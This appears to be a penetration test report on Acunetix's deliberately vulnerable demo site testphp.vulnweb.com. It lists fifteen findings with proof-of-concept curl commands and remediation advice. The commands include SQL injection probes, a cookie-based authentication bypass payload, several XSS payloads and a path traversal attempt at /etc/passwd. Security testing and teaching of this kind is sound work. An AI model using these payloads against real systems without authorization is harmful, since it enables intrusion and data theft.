# Detailed Vulnerability Report - testphp.vulnweb.com

**Assessment Date:** 2026-02-18
**Target:** testphp.vulnweb.com (44.228.249.3)
**Scope:** Host reconnaissance, URL analysis, vulnerability analysis (XSS/RCE/LFI/RFI)
**Tools:** Secator framework with integrated security tools

---

## Executive Summary

| Metric | Value |
|--------|-------|
| Total Vulnerabilities | 15+ |
| Critical | 5 |
| High | 6 |
| Medium | 3 |
| Low | 1 |
| URLs Discovered | 1,619 |

---

## Target Information

| Property | Value |
|----------|-------|
| Target | testphp.vulnweb.com |
| IP Address | 44.228.249.3 |
| Web Server | nginx/1.19.0 |
| Backend | PHP/5.6.40 (EOL) |
| Open Ports | 80 (HTTP) |
| WAF | None detected |

---

## 1. SQL Injection - listproducts.php

**Description:**
The `cat` parameter in `listproducts.php` is directly concatenated into SQL queries without sanitization, allowing attackers to inject arbitrary SQL commands.

**Severity:** CRITICAL
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CVSS Score:** 9.8

**Impact:**
- Full database access (read/write/delete)
- Authentication bypass
- Data exfiltration (usernames, passwords, credit cards)
- Potential remote code execution via `INTO OUTFILE` or `LOAD_FILE()`

**Proof-of-Concept:**
```bash
# Error-based SQLi confirmation
curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1'"

# Response contains:
# Error: You have an error in your SQL syntax; check the manual that
# corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

**Remediation:**
1. Use parameterized queries (prepared statements):
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE cat = ?");
$stmt->execute([$_GET['cat']]);
```
2. Implement input validation (whitelist numeric values)
3. Use ORM frameworks that handle escaping automatically
4. Apply least-privilege database permissions

---

## 2. SQL Injection - artists.php

**Description:**
The `artist` parameter is vulnerable to SQL injection, exposing the underlying MySQL database to unauthorized queries.

**Severity:** CRITICAL
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CVSS Score:** 9.8

**Impact:**
- Database compromise
- Unauthorized data access
- Potential privilege escalation

**Proof-of-Concept:**
```bash
# Error-based SQLi
curl -s "http://testphp.vulnweb.com/artists.php?artist=1'"

# Response:
# Error: You have an error in your SQL syntax; check the manual that
# corresponds to your MySQL server version for the right syntax to use near ''' at line 1

# UNION-based injection attempt
curl -s "http://testphp.vulnweb.com/artists.php?artist=1' UNION SELECT 1,2,3--"
```

**Remediation:**
1. Use prepared statements with bound parameters
2. Validate `artist` parameter as integer only
3. Implement Web Application Firewall (WAF) rules
4. Enable MySQL query logging for anomaly detection

---

## 3. SQL Injection - AJAX/infoartist.php

**Description:**
The AJAX endpoint `infoartist.php` accepts an `id` parameter that is vulnerable to SQL injection, returning XML-formatted data.

**Severity:** CRITICAL
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CVSS Score:** 9.8

**Impact:**
- Backend database compromise via AJAX calls
- Data extraction through XML responses
- Potential for blind SQL injection exploitation

**Proof-of-Concept:**
```bash
curl -s "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1'"

# Response:
# Error: You have an error in your SQL syntax; check the manual that
# corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

**Remediation:**
1. Sanitize all AJAX endpoint inputs
2. Use prepared statements
3. Implement rate limiting on AJAX endpoints
4. Add CSRF tokens to AJAX requests

---

## 4. SQL Injection - Cookie-based Authentication Bypass

**Description:**
The application parses the `login` cookie and directly injects its contents into SQL queries for authentication, allowing complete authentication bypass.

**Severity:** CRITICAL
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CVSS Score:** 9.8

**Impact:**
- Complete authentication bypass
- Account takeover of any user
- Administrative access without credentials
- Full application compromise

**Proof-of-Concept:**
```bash
# Authentication bypass via cookie injection
curl -s -H "Cookie: login=admin' OR '1'='1/password" \
  "http://testphp.vulnweb.com/index.php" | grep -i "logout"

# Response contains logout link - authentication bypassed!
# <li><a href="../logout.php">Logout</a></li>
```

**Vulnerable Source Code (from exposed index.php):**
```php
$login = explode('/', $_COOKIE["login"]);
$result = mysql_query("SELECT * FROM users WHERE uname='".$login[0]."' AND pass='".$login[1]."'");
```

**Remediation:**
1. Never trust cookie values - treat as untrusted input
2. Use secure session management instead of credential cookies
3. Hash and validate session tokens server-side
4. Implement prepared statements for all authentication queries
5. Use modern authentication frameworks (e.g., PHP's `password_hash()`)

---

## 5. Reflected XSS - search.php

**Description:**
The `test` parameter in `search.php` is reflected in the response without proper encoding, allowing injection of malicious JavaScript.

**Severity:** HIGH
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**CVSS Score:** 6.1

**Impact:**
- Session hijacking via cookie theft
- Credential harvesting through fake login forms
- Malware distribution
- Defacement
- Keylogging

**Proof-of-Concept:**
```bash
# Dalfox verified XSS
secator x dalfox "http://testphp.vulnweb.com/search.php?test=query"

# Manual verification
curl -s "http://testphp.vulnweb.com/search.php?test=<script>alert(1)</script>"

# Working payload (URL encoded):
# http://testphp.vulnweb.com/search.php?test='><img/src/onerror=.1|alert`` class=dalfox>
```

**Remediation:**
1. HTML-encode all user input before output:
```php
echo htmlspecialchars($_GET['test'], ENT_QUOTES, 'UTF-8');
```
2. Implement Content-Security-Policy headers
3. Use HttpOnly and Secure flags on cookies
4. Implement input validation (whitelist allowed characters)

---

## 6. Reflected XSS - listproducts.php

**Description:**
The `cat` parameter is reflected without sanitization, enabling JavaScript injection in addition to SQL injection.

**Severity:** HIGH
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**CVSS Score:** 6.1

**Impact:**
- Client-side attacks on users browsing products
- Combined with SQLi for maximum impact
- Session theft

**Proof-of-Concept:**
```bash
secator x dalfox "http://testphp.vulnweb.com/listproducts.php?cat=1"

# Verified XSS payload:
# http://testphp.vulnweb.com/listproducts.php?cat=1"><img/src/onerror=.1|alert`` class=dalfox>
```

**Remediation:**
1. Output encode the `cat` parameter
2. Validate as integer-only input
3. Implement CSP headers: `Content-Security-Policy: default-src 'self'`

---

## 7. Reflected XSS - artists.php

**Description:**
The `artist` parameter reflects user input without encoding, allowing XSS attacks.

**Severity:** HIGH
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**CVSS Score:** 6.1

**Impact:**
- User session compromise
- Phishing attacks
- Drive-by downloads

**Proof-of-Concept:**
```bash
secator x dalfox "http://testphp.vulnweb.com/artists.php?artist=1"

# Verified XSS payloads:
# artist='><img/src/onerror=.1|alert``>
# artist=</script><svg><script/class=dalfox>alert(1)</script>-%26apos;
```

**Remediation:**
1. Implement context-aware output encoding
2. Use template engines with auto-escaping (Twig, Blade)
3. Add X-XSS-Protection header (legacy browsers)
4. Implement strict CSP

---

## 8. Local File Inclusion (LFI) - showimage.php

**Description:**
The `file` parameter in `showimage.php` allows path traversal, enabling attackers to read files outside the intended directory. Although `open_basedir` provides partial mitigation, the vulnerability exists and discloses server paths.

**Severity:** HIGH
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**CVSS Score:** 7.5

**Impact:**
- Source code disclosure
- Configuration file access
- Server path disclosure (`/hj/var/www/`)
- Potential credential harvesting from config files
- May lead to RCE if combined with file upload

**Proof-of-Concept:**
```bash
# Path traversal attempt
curl -s "http://testphp.vulnweb.com/showimage.php?file=../../../../../etc/passwd"

# Response (path disclosure):
# Warning: fopen(): open_basedir restriction in effect.
# File(../../../../../etc/passwd) is not within the allowed path(s):
# (/hj/:/tmp/:/proc/) in /hj/var/www/showimage.php on line 13

# Reading files within allowed paths
curl -s "http://testphp.vulnweb.com/showimage.php?file=../index.php"
```

**Remediation:**
1. Use basename() to strip path components:
```php
$file = basename($_GET['file']);
```
2. Whitelist allowed files/directories
3. Avoid user input in file operations
4. Implement proper access controls
5. Keep open_basedir restrictions in place

---

## 9. Information Disclosure - Source Code Exposure

**Description:**
The file `index.zip` is publicly accessible, containing PHP source code including database connection logic and vulnerable authentication code.

**Severity:** HIGH
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**CVSS Score:** 7.5

**Impact:**
- Reveals vulnerable code patterns
- Exposes database connection strings
- Aids in crafting targeted exploits
- May contain hardcoded credentials

**Proof-of-Concept:**
```bash
# Download source code
curl -s "http://testphp.vulnweb.com/index.zip" -o source.zip
unzip -l source.zip

# Extract and view
unzip -p source.zip index.php | head -50

# Reveals vulnerable SQL query:
# mysql_query("SELECT * FROM users WHERE uname='".$login[0]."' AND pass='".$login[1]."'")
```

**Remediation:**
1. Remove all archive files from web root
2. Configure web server to deny access to .zip, .bak, .sql files
3. Implement access controls on sensitive files
4. Regular security audits for exposed files

---

## 10. Information Disclosure - IDE Configuration Exposure

**Description:**
JetBrains IDE configuration files (`.idea/`) are publicly accessible, revealing project structure, file paths, and development environment details.

**Severity:** MEDIUM
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CVSS Score:** 5.3

**Impact:**
- Internal path disclosure
- Project structure revelation
- Git configuration exposure
- Development workflow information leakage

**Proof-of-Concept:**
```bash
# Directory listing
curl -s "http://testphp.vulnweb.com/.idea/"

# Workspace configuration
curl -s "http://testphp.vulnweb.com/.idea/workspace.xml" | head -50

# Modules configuration
curl -s "http://testphp.vulnweb.com/.idea/modules.xml"

# Secator/Nuclei detection
secator x nuclei http://testphp.vulnweb.com --tags exposure
# Found: idea-folder-exposure @ /.idea/workspace.xml
```

**Remediation:**
1. Add to `.gitignore` and remove from repository
2. Block access via web server configuration:
```nginx
location ~ /\.idea {
    deny all;
    return 404;
}
```
3. Use deployment scripts that exclude IDE files

---

## 11. Information Disclosure - CVS Directory Exposure

**Description:**
The CVS version control directory is publicly accessible, potentially exposing repository information and file history.

**Severity:** MEDIUM
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CVSS Score:** 5.3

**Impact:**
- Version control metadata exposure
- Historical file versions
- Developer information leakage

**Proof-of-Concept:**
```bash
curl -s "http://testphp.vulnweb.com/CVS/"
curl -s "http://testphp.vulnweb.com/CVS/Entries"
curl -s "http://testphp.vulnweb.com/CVS/Root"
```

**Remediation:**
1. Remove CVS directories from production
2. Block access via web server:
```nginx
location ~ /CVS {
    deny all;
}
```

---

## 12. Outdated Software - PHP 5.6 (End-of-Life)

**Description:**
The server runs PHP 5.6.40, which reached end-of-life on December 31, 2018. This version has numerous unpatched security vulnerabilities.

**Severity:** CRITICAL
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CVSS Score:** 9.8

**Impact:**
- Hundreds of known CVEs remain unpatched
- Memory corruption vulnerabilities
- Type confusion bugs
- Serialization vulnerabilities
- No security updates available

**Proof-of-Concept:**
```bash
# Version disclosure via header
curl -sI "http://testphp.vulnweb.com/" | grep -i "x-powered-by"

# Response:
# X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1

# Also found via secator URL crawl
secator w url_crawl http://testphp.vulnweb.com -o json
# response_headers contains X-Powered-By
```

**Remediation:**
1. **URGENT:** Upgrade to PHP 8.1+ (current stable)
2. Remove X-Powered-By header:
```php
ini_set('expose_php', 'Off');
```
3. Test application compatibility before upgrade
4. Implement security patches during migration

---

## 13. Outdated Software - nginx 1.19.0 (Multiple CVEs)

**Description:**
The server runs nginx 1.19.0 with multiple known vulnerabilities including the actively exploited HTTP/2 Rapid Reset attack (CVE-2023-44487).

**Severity:** HIGH
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
**CVSS Score:** 7.5

**Impact:**
- Denial of Service (HTTP/2 Rapid Reset)
- Memory corruption in mp4 module
- Memory disclosure
- ALPACA attack vulnerability

**Proof-of-Concept:**
```bash
# Version detection
secator x nmap testphp.vulnweb.com --version-detection --top-ports 100

# Output:
# 44.228.249.3:80 OPEN [tcp] [nginx/1.19.0]

# CVE enumeration via secator host_recon
secator w host_recon testphp.vulnweb.com

# Found CVEs:
# CVE-2023-44487 [HIGH] - HTTP/2 Rapid Reset (CISA Known Exploited)
# CVE-2021-3618  [HIGH] - ALPACA attack
# CVE-2022-41741 [HIGH] - Memory corruption in mp4 module
# CVE-2022-41742 [HIGH] - Memory disclosure in mp4 module
# CVE-2025-53859 [MEDIUM]
# CVE-2024-7347  [MEDIUM]
# CVE-2025-23419 [MEDIUM]
```

**Remediation:**
1. Upgrade nginx to latest stable version (1.24+)
2. If HTTP/2 not needed, disable it
3. Disable unused modules (mp4, etc.)
4. Subscribe to nginx security advisories
5. Implement automated patching pipeline

---

## 14. Directory Listing / Sensitive Directories

**Description:**
Multiple sensitive directories are accessible including admin panel, vendor dependencies, and server scripts.

**Severity:** MEDIUM
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CVSS Score:** 5.3

**Impact:**
- Administrative interface exposure
- Third-party library version disclosure
- Potential for further exploitation

**Proof-of-Concept:**
```bash
# Directory fuzzing with secator
secator x ffuf http://testphp.vulnweb.com -mc 200,301,302,401,403,500

# Found directories:
curl -s "http://testphp.vulnweb.com/admin/"       # Admin panel
curl -s "http://testphp.vulnweb.com/vendor/"      # Dependencies
curl -s "http://testphp.vulnweb.com/images/"      # Directory listing
curl -s "http://testphp.vulnweb.com/_mmServerScripts/"  # Server scripts
```

**Remediation:**
1. Implement authentication on admin directory
2. Disable directory listing:
```nginx
autoindex off;
```
3. Move vendor directory outside web root
4. Restrict access to non-public directories

---

## 15. HTTP Parameter Pollution (HPP)

**Description:**
The application contains an HPP example directory demonstrating vulnerability to parameter pollution attacks.

**Severity:** LOW
**CVSS 3.1 Vector:** `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N`
**CVSS Score:** 4.2

**Impact:**
- Bypass security filters
- WAF evasion
- Logic manipulation

**Proof-of-Concept:**
```bash
curl -s "http://testphp.vulnweb.com/hpp/?pp=12"
```

**Remediation:**
1. Use only the first or last parameter value consistently
2. Validate and sanitize all parameters
3. Implement strict parameter handling

---

## Summary Table

| # | Vulnerability | Severity | CVSS | Status |
|---|--------------|----------|------|--------|
| 1 | SQLi - listproducts.php | CRITICAL | 9.8 | Verified |
| 2 | SQLi - artists.php | CRITICAL | 9.8 | Verified |
| 3 | SQLi - AJAX/infoartist.php | CRITICAL | 9.8 | Verified |
| 4 | SQLi - Cookie Auth Bypass | CRITICAL | 9.8 | Verified |
| 5 | XSS - search.php | HIGH | 6.1 | Verified |
| 6 | XSS - listproducts.php | HIGH | 6.1 | Verified |
| 7 | XSS - artists.php | HIGH | 6.1 | Verified |
| 8 | LFI - showimage.php | HIGH | 7.5 | Verified |
| 9 | Source Code Exposure | HIGH | 7.5 | Verified |
| 10 | IDE Config Exposure | MEDIUM | 5.3 | Verified |
| 11 | CVS Directory Exposure | MEDIUM | 5.3 | Verified |
| 12 | PHP 5.6 EOL | CRITICAL | 9.8 | Confirmed |
| 13 | nginx CVEs | HIGH | 7.5 | Confirmed |
| 14 | Directory Exposure | MEDIUM | 5.3 | Verified |
| 15 | HTTP Parameter Pollution | LOW | 4.2 | Confirmed |

---

## Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| secator w host_recon | Host reconnaissance | `secator w host_recon testphp.vulnweb.com` |
| secator w url_crawl | URL discovery | `secator w url_crawl http://testphp.vulnweb.com` |
| secator x dalfox | XSS verification | `secator x dalfox "http://testphp.vulnweb.com/search.php?test=query"` |
| secator x nuclei | Template-based scanning | `secator x nuclei http://testphp.vulnweb.com --tags exposure` |
| secator x ffuf | Directory fuzzing | `secator x ffuf http://testphp.vulnweb.com` |
| secator x nmap | Port scanning | `secator x nmap testphp.vulnweb.com --version-detection` |
| secator x wafw00f | WAF detection | `secator x wafw00f http://testphp.vulnweb.com` |
| curl | Manual verification | Various commands |

---

## Recommendations Priority

### Immediate (Critical)
1. Upgrade PHP from 5.6 to 8.1+
2. Fix all SQL injection vulnerabilities using prepared statements
3. Implement proper session management (remove credential cookies)
4. Remove exposed source code files (index.zip)

### Short-term (High)
1. Upgrade nginx to latest stable version
2. Implement output encoding for all XSS vulnerabilities
3. Fix LFI in showimage.php
4. Add authentication to admin directory

### Medium-term (Medium)
1. Block access to .idea, CVS, and other sensitive directories
2. Disable directory listing
3. Implement Content-Security-Policy headers
4. Remove X-Powered-By header

### Long-term
1. Implement Web Application Firewall (WAF)
2. Set up automated vulnerability scanning
3. Establish security patch management process
4. Conduct regular penetration testing

---

## Report Metadata

| Field | Value |
|-------|-------|
| Report Generated | 2026-02-18 |
| Assessment Type | Web Application Penetration Test |
| Framework Used | Secator v0.25.5 |
| Total Scan Duration | ~15 minutes |
| URLs Discovered | 1,619 |
| Unique Vulnerabilities | 15+ |

---

*This assessment was conducted on an intentionally vulnerable application (Acunetix testphp.vulnweb.com) for authorized security testing purposes.*
